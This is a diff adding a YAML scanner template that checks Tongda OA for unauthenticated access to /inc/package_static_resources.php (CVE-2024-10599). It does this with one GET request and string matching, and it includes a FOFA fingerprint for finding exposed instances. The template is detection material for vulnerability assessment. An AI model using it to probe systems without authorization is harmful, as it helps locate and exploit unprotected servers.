@@ -1,0 +1,22 @@
+id: poc-yaml-tongda-oa-resources-package
+info:
+  name: 通达OA package_static_resources.php 未授权访问(CVE-2024-10599)
+  severity: medium
+  tags:
+  - 两高一弱
+  - 认证绕过
+  - CVE-2024-10599
+  finger: 通达OA
+  fofa: app="TDXK-通达OA"
+requests:
+- method: GET
+  path: /inc/package_static_resources.php
+  expression: "status_code == 200 && (\n  (\n  contains(gbk_decode(body),\"读取\") &&\n\
+    \  contains(gbk_decode(body),\"/static/mobile\") &&\n  contains(gbk_decode(body),\"\
+    写入\") &&\n  contains(gbk_decode(body),\".js<br>\") &&\n  contains(gbk_decode(body),\"\
+    .css<br>\") &&\n  contains(gbk_decode(body),\"打包成功\")\n  ) || (\n  contains(body,\"\
+    读取\") &&\n  contains(body,\"/static/mobile\") &&\n  contains(body,\"写入\") &&\n\
+    \  contains(body,\".js<br>\") &&\n  contains(body,\".css<br>\") &&\n  contains(body,\"\
+    打包成功\") \n  )\n)\n"
+variables: {}
+transport: http
